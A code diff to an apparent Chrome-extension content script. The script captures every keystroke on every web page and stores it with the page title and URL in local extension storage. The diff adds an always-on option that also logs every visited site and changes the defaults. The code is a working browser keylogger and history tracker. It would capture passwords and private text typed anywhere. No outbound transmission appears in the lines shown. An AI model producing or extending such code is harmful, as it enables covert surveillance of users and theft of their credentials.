@@ -5,10 +5,16 @@ var lastKey = 0; // Lastkey is used to prevent multiple listeners registering th
 var isMac = (window.navigator.appVersion.indexOf("Mac OS") ? true : false); //Check if Mac for command/window and alt/option keys
 var json = {};
 
-chrome.storage.local.set({saveType: 'explicit'}, function(x) {console.log('Set')});
+chrome.storage.sync.set({saveType: 'normal', saveAll: 'true'}, function() {});
 console.log('mac', isMac);
-chrome.storage.local.get('saveType', function(res) {
-	console.log('saveType', res.saveType);
+
+chrome.storage.sync.get(function(res) {
+	if (res.saveAll) {
+		lastURL = document.URL;
+		lastTime = utc();
+		json[lastTime] = document.title + "^~^" + document.URL + "^~^";
+		chrome.storage.local.set(json, function() { console.log('new site'); });
+	}
 	if (res.saveType == "normal") {
 		document.addEventListener('keypress', function (e) {
 			var now = utc();
@@ -25,17 +31,17 @@ chrome.storage.local.get('saveType', function(res) {
 				chrome.storage.local.set(json, function() { console.log(key, e); });
 			}
 		});
-	} else if (res.saveType == "explicit") {
+	} else if (res.saveType == "detailed") {
 		document.addEventListener('keydown', function (e) {
 			var now = utc();
-			if (now - lastKey > 10) { // Stop duplicates (most people cannot press 2 keys in 10 milliseconds)
+			if (now - lastKey > 10) {
 				lastKey = now;
 				key = getKey(e);
-				if (e.view.document.URL != lastURL) { // Keys depend on URL's, new URL = new key
+				if (e.view.document.URL != lastURL) {
 					lastURL = e.view.document.URL;
 					lastTime = now;
 					json[lastTime] = e.view.document.title + "^~^" + e.view.document.URL + "^~^" + key;
-				} else { // Append to existing key
+				} else {
 					json[lastTime] += key;
 				}
 				chrome.storage.local.set(json, function() { console.log(key, e); });
@@ -108,7 +114,11 @@ function getKey(event) {
 				return "[R WINDOW]"; // right window
 			}
 		} else if (charCode == 93) {
-			return "[SELECT]"; // select key
+			if (isMac) {
+				return "[R COMMAND]";
+			} else {
+				return "[SELECT]"; // select key
+			}
 		} else if (charCode == 96) {
 			return "[NUM 0]"; // numpad 0
 		} else if (charCode == 97) {
